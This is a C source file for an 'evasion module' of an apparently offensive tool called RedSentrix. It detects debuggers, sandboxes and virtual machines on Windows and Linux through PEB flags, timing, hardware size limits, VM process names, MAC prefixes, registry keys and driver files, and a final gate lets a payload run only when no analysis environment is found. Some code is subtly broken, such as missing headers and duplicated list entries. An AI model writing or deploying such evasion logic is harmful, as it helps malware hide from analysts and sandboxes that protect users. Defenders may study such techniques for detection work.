/*
 * RedSentrix - Evasion Module (C)
 * Anti-debugging, sandbox detection, VM detection
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#else
#include <unistd.h>
#include <sys/stat.h>
#include <dirent.h>
#endif

// Evasion check results
typedef struct {
    int debugger_detected;
    int sandbox_detected;
    int vm_detected;
    int analysis_tools_detected;
} evasion_result_t;

/*
 * Anti-Debugging Checks (Windows)
 */
#ifdef _WIN32
int check_debugger() {
    // Check for debugger using IsDebuggerPresent
    if (IsDebuggerPresent()) {
        return 1;
    }

    // Check PEB BeingDebugged flag
    PPEB peb = (PPEB)__readgsqword(0x60);
    if (peb->BeingDebugged) {
        return 1;
    }

    // Check NtGlobalFlag
    if (peb->NtGlobalFlag & 0x70) {
        return 1;
    }

    // Check for remote debugger
    BOOL debugger_present = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugger_present);
    if (debugger_present) {
        return 1;
    }

    // Timing check
    DWORD start = GetTickCount();
    Sleep(100);
    DWORD elapsed = GetTickCount() - start;
    if (elapsed > 150) { // Debugger slows execution
        return 1;
    }

    return 0;
}

/*
 * Sandbox Detection
 */
int check_sandbox() {
    // Check CPU count (sandboxes often have 1-2 cores)
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) {
        return 1;
    }

    // Check RAM (sandboxes often have low RAM)
    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) { // Less than 2GB
        return 1;
    }

    // Check disk size
    ULARGE_INTEGER free_bytes;
    GetDiskFreeSpaceExA("C:\\", NULL, NULL, &free_bytes);
    if (free_bytes.QuadPart < 10ULL * 1024 * 1024 * 1024) { // Less than 10GB
        return 1;
    }

    // Check uptime (sandboxes often reset)
    DWORD uptime = GetTickCount();
    if (uptime < 30 * 60 * 1000) { // Less than 30 minutes
        return 1;
    }

    // Check for common sandbox processes
    const char *sandbox_processes[] = {
        "vboxservice.exe", "vboxtray.exe", "vmwaretray.exe",
        "vmwareuser.exe", "vmtoolsd.exe", "vmware.exe",
        "vmsrvc.exe", "vmusrvc.exe", "vmwareuser.exe",
        "vboxservice.exe", "vboxtray.exe", "vmwaretray.exe"
    };

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe32)) {
            do {
                for (int i = 0; i < sizeof(sandbox_processes) / sizeof(sandbox_processes[0]); i++) {
                    if (_stricmp(pe32.szExeFile, sandbox_processes[i]) == 0) {
                        CloseHandle(hSnapshot);
                        return 1;
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }

    return 0;
}

/*
 * VM Detection
 */
int check_vm() {
    // Check MAC address (VM vendors have specific OUI)
    IP_ADAPTER_INFO adapter_info[16];
    DWORD buf_len = sizeof(adapter_info);
    DWORD status = GetAdaptersInfo(adapter_info, &buf_len);
    
    if (status == ERROR_SUCCESS) {
        PIP_ADAPTER_INFO adapter = adapter_info;
        while (adapter) {
            unsigned char *mac = adapter->Address;
            // VMware: 00:0C:29, 00:50:56, 00:05:69
            // VirtualBox: 08:00:27
            if ((mac[0] == 0x00 && mac[1] == 0x0C && mac[2] == 0x29) ||
                (mac[0] == 0x00 && mac[1] == 0x50 && mac[2] == 0x56) ||
                (mac[0] == 0x00 && mac[1] == 0x05 && mac[2] == 0x69) ||
                (mac[0] == 0x08 && mac[1] == 0x00 && mac[2] == 0x27)) {
                return 1;
            }
            adapter = adapter->Next;
        }
    }

    // Check registry for VM artifacts
    HKEY hKey;
    const char *vm_registry_keys[] = {
        "SOFTWARE\\VMware, Inc.\\VMware Tools",
        "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
        "SYSTEM\\CurrentControlSet\\Services\\VBoxMouse",
        "SYSTEM\\CurrentControlSet\\Services\\VBoxService",
        "SYSTEM\\CurrentControlSet\\Services\\VBoxSF"
    };

    for (int i = 0; i < sizeof(vm_registry_keys) / sizeof(vm_registry_keys[0]); i++) {
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, vm_registry_keys[i], 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return 1;
        }
    }

    // Check for VM-specific files
    const char *vm_files[] = {
        "C:\\windows\\system32\\drivers\\vmmouse.sys",
        "C:\\windows\\system32\\drivers\\vmhgfs.sys",
        "C:\\windows\\system32\\drivers\\VBoxMouse.sys",
        "C:\\windows\\system32\\drivers\\VBoxGuest.sys",
        "C:\\windows\\system32\\drivers\\VBoxSF.sys",
        "C:\\windows\\system32\\drivers\\VBoxVideo.sys"
    };

    for (int i = 0; i < sizeof(vm_files) / sizeof(vm_files[0]); i++) {
        if (GetFileAttributesA(vm_files[i]) != INVALID_FILE_ATTRIBUTES) {
            return 1;
        }
    }

    return 0;
}
#endif

/*
 * Linux Evasion Checks
 */
#ifndef _WIN32
int check_debugger_linux() {
    // Check for ptrace
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
        return 1; // Already being traced
    }

    // Check /proc/self/status for TracerPid
    FILE *f = fopen("/proc/self/status", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "TracerPid:", 10) == 0) {
                int pid = atoi(line + 10);
                fclose(f);
                if (pid != 0) {
                    return 1;
                }
            }
        }
        fclose(f);
    }

    return 0;
}

int check_sandbox_linux() {
    // Check CPU count
    FILE *f = fopen("/proc/cpuinfo", "r");
    if (f) {
        int cpu_count = 0;
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "processor", 9) == 0) {
                cpu_count++;
            }
        }
        fclose(f);
        if (cpu_count < 2) {
            return 1;
        }
    }

    // Check RAM
    f = fopen("/proc/meminfo", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "MemTotal:", 9) == 0) {
                long mem_kb = atol(line + 9);
                fclose(f);
                if (mem_kb < 2 * 1024 * 1024) { // Less than 2GB
                    return 1;
                }
            }
        }
        fclose(f);
    }

    // Check uptime
    f = fopen("/proc/uptime", "r");
    if (f) {
        float uptime;
        if (fscanf(f, "%f", &uptime) == 1) {
            fclose(f);
            if (uptime < 1800) { // Less than 30 minutes
                return 1;
            }
        } else {
            fclose(f);
        }
    }

    return 0;
}
#endif

/*
 * Main evasion check function
 */
evasion_result_t perform_evasion_checks() {
    evasion_result_t result = {0};

#ifdef _WIN32
    result.debugger_detected = check_debugger();
    result.sandbox_detected = check_sandbox();
    result.vm_detected = check_vm();
#else
    result.debugger_detected = check_debugger_linux();
    result.sandbox_detected = check_sandbox_linux();
    result.vm_detected = 0; // VM detection on Linux is more complex
#endif

    return result;
}

/*
 * Check if safe to proceed
 */
int is_safe_to_proceed() {
    evasion_result_t result = perform_evasion_checks();
    
    if (result.debugger_detected || result.sandbox_detected || result.vm_detected) {
        return 0;
    }
    
    return 1;
}

